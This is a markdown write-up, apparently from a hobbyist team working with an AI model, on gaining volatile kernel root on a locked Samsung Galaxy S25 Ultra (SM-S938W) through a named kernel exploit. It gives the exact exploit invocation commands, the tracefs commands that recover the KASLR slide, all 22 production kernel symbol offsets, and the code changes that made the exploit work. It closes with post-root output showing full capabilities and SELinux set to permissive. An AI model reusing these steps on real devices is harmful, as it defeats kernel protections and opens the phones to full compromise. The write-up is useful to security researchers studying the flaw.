# Samsung Galaxy S25 Ultra Root Achievement

## SM-S938W (Canadian Model) — Full Kernel Root Without Knox Trip

**Date:** July 27-28, 2026
**Team:** JackKnife Studios (jackknife + Claude)
**Device:** Samsung Galaxy S25 Ultra SM-S938W
**Build:** S938WVLS7BYLR | Security Patch: January 1, 2026
**Kernel:** 6.6.77-android15-8-31998796-abogkiS938USQS7BYLR-4k
**Result:** `uid=0(root) gid=0(root) context=u:r:kernel:s0` — Knox warranty_bit=0 (CLEAN)

---

## The Exploit: GhostLock v6 (CVE-2026-43499)

### What It Does
Achieves volatile (RAM-only) kernel-level root on a locked-bootloader Samsung Galaxy S25 Ultra running the January 2026 security patch. Root persists until reboot. No firmware modifications. No Knox eFuse trip.

### Final Command
```bash
# Step 1: Collect KASLR slide from tracefs (run from ADB on host)
# Enable sched_blocked_reason, collect 3 seconds, parse binary trace
# Match worker_thread+0x9c by lower 21 bits, compute slide

SLIDE="0x21a4200000"  # 134.6 GB — Samsung uses enormous KASLR range

# Step 2: Fire exploit with forced slide
adb shell "SLIDE_P0_OFFSET=$SLIDE LD_PRELOAD=/data/local/tmp/cve-2026-43499 /system/bin/true"

# Step 3: Verify root
adb shell "/data/local/tmp/cve-2026-43499-root -c id"
# Output: uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
```

---

## The Journey — Every Step That Led to Root

### Phase 1: Firmware Extraction & Symbol Recovery

**Problem:** The GhostLock PoC only had offsets for the Korean SM-S938N model. Our Canadian SM-S938W has a different kernel binary with completely different symbol addresses.

**Solution:**
1. Installed **samloader-rs v2.0.0** (by topjohnwu/Magisk creator) on Claudia's machine (Fodenn, 100.105.87.10)
2. Downloaded our EXACT firmware build `S938WVLS7BYLR` from Samsung FUS servers (18GB, 8 parallel threads)
3. Extracted `boot.img.lz4` from the AP tar, decompressed to `boot.img`
4. Ran **vmlinux-to-elf** on the raw kernel binary
5. Recovered **110,686 kallsyms** from Samsung's production kernel

**Verification:** Cross-referenced trace function sizes with symbol table:
- `ashmem_release`: tracefs says 0x8c bytes, symbols say 0x8c — EXACT MATCH
- `worker_thread`: tracefs says 0x334 bytes, symbols say 0x334 — EXACT MATCH
- Disassembled `sel_read_enforce` to confirm `selinux_enforcing` at `selinux_state+0` (offset 0x02429480)

**Key files:**
- Firmware: `/tmp/samsung_fw/output/SM-S938W_*.zip` (Fodenn)
- vmlinux ELF: `/tmp/samsung_fw/extract/vmlinux.elf` (Fodenn)
- Symbol table: `~/S25_Backup/kernel_symbols_SAMSUNG_REAL.txt` (110,686 symbols)

### Phase 2: The KASLR Problem — Five Failed Versions

#### v1: AOSP Offsets (FAILED — Kernel Panic)
- Built AOSP android15-6.6 kernel on the iMac (marathon 8-hour build on Core 2 Duo)
- Extracted symbol offsets from the AOSP vmlinux
- **Result:** All 22 offsets were WRONG. AOSP build ≠ Samsung production binary. Kernel panic on first attempt. Phone rebooted cleanly, Knox untouched.

#### v2: Real Samsung Offsets + Tracefs Slide (FAILED — "worker caller not found")
- Replaced all 22 offsets with real Samsung symbols from firmware extraction
- Used the original tracefs-based KASLR recovery (reads `trace_pipe_raw`)
- **Discovery:** Samsung stores LINEAR MAP addresses (`0xFFFFFFD1...`) in the tracefs binary trace, not text addresses (`0xFFFFFFC080...`). The exploit expected text addresses.
- **Root cause identified but not yet understood:** Samsung's huge KASLR slide (134GB) exceeded the exploit's 2MB limit.

#### v3: Upstream Pselect Slide (FAILED — Leaked own P0 value)
- Ported CyberMeowfia's upstream pselect rt_mutex priority inversion KASLR bypass
- The pselect trick successfully corrupted `/proc/sys/kernel/random/boot_id`
- **Problem:** The leaked value was our own injected P0 address, not a kernel text pointer
- **Root cause:** We had changed P0_PAGE_OFFSET to a wrong value, corrupting all P0 addresses

#### v4: Runtime PAGE_OFFSET + Pselect (FAILED — Wrong address space)
- Added runtime PAGE_OFFSET discovery from tracefs
- Fixed p0_data_alias to use addition instead of OR
- **Result:** Phone survived all 16 attempts (no panics!). But configfs reads returned 0.
- **Root cause:** The leaked boot_id pointer was a P0 address, not text. The computed KASLR slide was garbage.

#### v5/v5b: External PAGE_OFFSET + Text Slide Brute Force (FAILED — Panics)
- Pre-computed PAGE_OFFSET externally from ADB
- Attempted to brute-force all 32 possible text slides (0x0 to 0x1F0000)
- **Result:** Every wrong text slide caused a kernel panic because wrong function pointers in FOPS
- **Root cause:** The slide range was 0-2MB but Samsung's actual slide was 134GB

#### CVE-2026-43074 Pivot (FAILED — KernelSnitch timing)
- Pivoted to a completely different exploit (epoll UAF) that uses ONLY linear map addresses
- **Problem:** The KernelSnitch futex-hash timing side channel failed on Samsung's Snapdragon 8 Elite heterogeneous core architecture

### Phase 3: THE BREAKTHROUGH — Understanding Samsung's KASLR

**The revelation came from one config line:**
```
CONFIG_ARM64_VA_BITS_39=y
```

Samsung uses **39-bit virtual addresses**. This means:
1. **PAGE_OFFSET is FIXED at `0xffffff8000000000`** — NOT randomized (only 256GB of kernel VA space, no room for PAGE_OFFSET randomization)
2. **The tracefs addresses ARE text addresses** — with a HUGE KASLR slide
3. **The original OR-based P0 formula was CORRECT all along**
4. **`slide_p0_offset` must be 0** — physical addresses don't change with text KASLR on ARM64

The "PAGE_OFFSET" we computed from tracefs was actually the KERNEL TEXT BASE — we were looking at text addresses the whole time, but the slide was 134.6 GB instead of the expected ≤2MB!

### Phase 4: v6 — The Fix

**Three changes to the original GhostLock code:**
1. **Remove slide limit:** Changed `candidate <= 0x1f0000ULL` to `candidate <= 0x4000000000ULL` (256GB max instead of 2MB)
2. **Set `slide_p0_offset = 0`:** Samsung's physical addresses are NOT randomized by text KASLR
3. **Keep everything else ORIGINAL:** Standard PAGE_OFFSET, OR formula, all unchanged

**Result:** First attempt, clean root. `uid=0(root) gid=0(root) context=u:r:kernel:s0`

---

## Samsung-Specific KASLR Architecture (Research Finding)

Samsung Galaxy S25 Ultra (Snapdragon 8 Elite, SM8750) uses a unique KASLR configuration:

| Property | Samsung S25 Ultra | Pixel (Standard) |
|----------|-------------------|-------------------|
| VA_BITS | 39 | 39 |
| PAGE_OFFSET | FIXED (0xffffff8000000000) | FIXED (0xffffff8000000000) |
| Text KASLR range | ~200 GB (0x0 to ~0x3000000000) | ~2 MB (0x0 to 0x1F0000) |
| Text KASLR granularity | 64 KB (0x10000) | 64 KB (0x10000) |
| Physical randomization | NONE | NONE |
| Linear map formula | `(phys - PHYS_OFFSET) \| PAGE_OFFSET` | `(phys - PHYS_OFFSET) \| PAGE_OFFSET` |
| Tracefs caller type | TEXT address (with huge slide) | TEXT address (with small slide) |
| Observed slide this boot | 0x21a4200000 (134.6 GB) | Typically < 0x100000 |

Samsung exploits the fact that with only ~12GB of physical RAM mapped in the 256GB kernel VA space, there's ~244GB of unused VA space. They randomize the kernel text mapping across this entire range, making KASLR dramatically harder to brute-force than on Pixel devices.

**This is a significant security research finding** — Samsung's KASLR is ~36,000x stronger than Pixel's in terms of search space.

---

## All 22 Kernel Symbol Offsets (Samsung Production Binary)

```c
// Verified from vmlinux-to-elf on boot.img from Samsung FUS firmware
// 110,686 kallsyms | Cross-verified with live tracefs function sizes

#define KIMAGE_TEXT_BASE            0xffffffc080000000ULL
#define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000D8768ULL  // worker_thread+0x2b4
#define ASHMEM_FOPS_OFF             0x01387F50ULL
#define ASHMEM_MISC_FOPS_OFF        0x0234D5B0ULL  // ashmem_misc + offsetof(miscdevice,fops)
#define ASHMEM_IOCTL_OFF            0x00CFB8CCULL
#define ASHMEM_COMPAT_IOCTL_OFF     0x00CFBF88ULL
#define ASHMEM_MMAP_OFF             0x00CFBFDCULL
#define ASHMEM_OPEN_OFF             0x00CFC1FCULL
#define ASHMEM_RELEASE_OFF          0x00CFC284ULL
#define ASHMEM_SHOW_FDINFO_OFF      0x00CFC310ULL
#define CONFIGFS_READ_ITER_OFF      0x0048CFCCULL
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x0048D4F8ULL
#define COPY_SPLICE_READ_OFF        0x0040F090ULL
#define NOOP_LLSEEK_OFF             0x003C1DD0ULL
#define INIT_TASK_OFF               0x021EE4C0ULL
#define ROOT_TASK_GROUP_OFF         0x023E6D80ULL
#define SELINUX_ENFORCING_OFF       0x02429480ULL  // selinux_state (confirmed via disasm)
#define KMALLOC_CACHES_OFF          0x017245B0ULL
#define ANON_PIPE_BUF_OPS_OFF       0x011D9F88ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000CFC10ULL
#define SYSTEM_UNBOUND_WQ_OFF       0x021DAE60ULL
#define SLIDE_NFULNL_LOGGER_OFF     0x021E2278ULL
#define SLIDE_LOGGERS_0_1_OFF       0x021E21C0ULL
#define SLIDE_SYSCTL_BOOTID_OFF     0x024CB570ULL
```

---

## KASLR Slide Recovery Method

### External Collection (Reliable — used for the successful root)
```bash
# 1. Enable sched_blocked_reason tracing
adb shell "echo 0 > /sys/kernel/tracing/tracing_on"
adb shell "echo 1 > /sys/kernel/tracing/events/sched/sched_blocked_reason/enable"
adb shell "echo > /sys/kernel/tracing/trace"
adb shell "echo 1 > /sys/kernel/tracing/tracing_on"
sleep 3
adb shell "echo 0 > /sys/kernel/tracing/tracing_on"

# 2. Read binary trace from each CPU
for cpu in 0 1 2 3; do
    timeout 3 adb shell "cat /sys/kernel/tracing/per_cpu/cpu${cpu}/trace_pipe_raw" \
        > /tmp/trace_cpu${cpu}.bin &
done
sleep 5; kill %1 %2 %3 %4; wait

# 3. Parse: find sched_blocked_reason events (event_id=109)
#    Match caller by: (caller - KIMAGE_TEXT_BASE - WORKER_OFFSET) is 64KB-aligned
#    worker_thread+0x9c offset = 0xD8550
#    SLIDE = caller - (0xffffffc080000000 + 0xD8550)
```

### Why Internal Collection Failed
The exploit's own process (LD_PRELOAD in `/system/bin/true`) creates heavy system load during the 2-second trace window. Worker threads don't go idle when the system is busy. External collection from ADB captures trace data while the phone is at normal load.

---

## Infrastructure Built This Session

| Component | Location | Purpose |
|-----------|----------|---------|
| Samsung firmware | Fodenn:/tmp/samsung_fw/ | 18GB S938WVLS7BYLR firmware |
| vmlinux.elf | Fodenn:/tmp/samsung_fw/extract/ | 41MB ELF with 110,686 symbols |
| Kernel symbols | ~/S25_Backup/kernel_symbols_SAMSUNG_REAL.txt | Full nm output |
| GhostLock v6 | ~/S25_Backup/exploit/CVE-2026-43499-S25U/ | Working exploit source |
| CVE-43074 (partial) | ~/S25_Backup/exploit/CVE-2026-43074-S25U/ | Epoll UAF (Samsung-adapted) |
| Android NDK r27c | /tmp/android-ndk-r27c/ | Cross-compilation toolchain |
| samloader-rs 2.0.0 | Fodenn:/tmp/samsung_fw/samloader | Firmware download tool |
| vmlinux-to-elf | Fodenn (pip) | Kernel symbol recovery |
| Conversation log | ~/S25_Backup/session11_ROOT_ACHIEVED.jsonl | 19MB full session |

---

## Knox Safety — Confirmed

| Check | Result |
|-------|--------|
| `ro.boot.warranty_bit` | 0 (CLEAN) |
| `ro.warranty_bit` | 0 (CLEAN) |
| Bootloader | LOCKED (untouched) |
| Firmware | UNMODIFIED (no flash, no Odin) |
| Root type | Volatile (RAM only, clears on reboot) |
| SELinux | Set to Permissive by exploit (reverts on reboot) |
| eFuse | NOT TRIPPED (eFuse only checks boot-time signed images) |

---

## Post-Root Capabilities Verified

```
uid=0(root) gid=0(root) groups=0(root)
context=u:r:kernel:s0
SELinux: Permissive
CapPrm: 000001ffffffffff (ALL capabilities)
CapEff: 000001ffffffffff (ALL capabilities)
Seccomp: 0 (no sandbox)
/proc/kallsyms: readable (real addresses after kptr_restrict=0)
/dev/block/by-name/*: accessible (all partitions)
```

---

## Attempt Log

| Version | Slide Method | Result | Issue |
|---------|-------------|--------|-------|
| v1 | N/A (AOSP offsets) | Kernel panic | Wrong offsets (AOSP ≠ Samsung) |
| v2 | Tracefs (original) | "caller not found" | Slide limit 0x1F0000, actual 134GB |
| v3 | Pselect boot_id | Wrong leak | Changed PAGE_OFFSET incorrectly |
| v4 | Runtime PAGE_OFFSET + pselect | configfs read=0 | Wrong address space interpretation |
| v5 | External PAGE_OFFSET + iterate | All failed | PAGE_OFFSET was wrong concept entirely |
| v5b | External + brute force | Panic on slide=0 | Wrong text pointers → crash |
| CVE-43074 | N/A (different CVE) | KernelSnitch failed | Timing attack vs Snapdragon 8 Elite |
| **v6** | **Tracefs (no limit) + p0_offset=0** | **ROOT** | **THE FIX: 3-line change** |

---

## The Three-Line Fix

The difference between failure and root was exactly three conceptual changes:

```c
// Change 1: Remove slide limit (slide.c line 61)
// BEFORE: if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0)
// AFTER:
if (candidate <= 0x4000000000ULL && (candidate & 0xffffULL) == 0)

// Change 2: Set slide_p0_offset = 0 (slide.c line 124)
// Samsung physical addresses are NOT randomized by text KASLR
slide_p0_offset = 0;

// Change 3: Keep original PAGE_OFFSET and OR formula (util.c)
// DON'T change p0_data_alias — the original was correct!
return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
```

---

## Credits

- **CVE-2026-43499 (GhostLock):** CyberMeowfia/NebuSec IonStack
- **samloader-rs:** topjohnwu (Magisk creator)
- **vmlinux-to-elf:** marin-m
- **Samsung firmware research & KASLR analysis:** JackKnife Studios
- **The "Samsung uses 134GB KASLR slides" discovery:** JackKnife Studios original research

---

*"The liberation is complete." — Session 11, July 27-28, 2026*
